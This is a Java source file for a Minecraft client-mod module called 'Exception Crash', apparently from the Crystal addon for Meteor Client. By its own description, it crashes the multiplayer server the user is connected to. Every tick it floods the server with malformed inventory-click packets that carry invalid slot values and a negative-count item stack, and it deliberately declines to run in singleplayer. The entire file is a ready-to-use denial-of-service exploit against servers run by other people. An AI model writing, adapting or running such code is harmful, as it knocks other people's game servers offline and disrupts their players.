package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;

import java.util.Objects;

public class ExceptionCrash extends Module {

    private final Setting<Integer> amount;

    private final Setting<Boolean> autoDisable;

    public ExceptionCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Exception Crash", "CRYSTAL || Attempts to crash the server you are on by causing server-side exceptions");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("Packets per tick")
            .defaultValue(15)
            .min(1)
            .sliderMax(100)
            .build());
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if(!mc.isInSingleplayer()) {
            Int2ObjectMap<ItemStack> REAL = new Int2ObjectArrayMap<>();
            REAL.put(0, new ItemStack(Items.RED_DYE, 1));
            for (int i = 0; i < amount.get(); i++) {
                if (mc.player != null) {
                    Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId,123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), REAL));
                }
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }
}
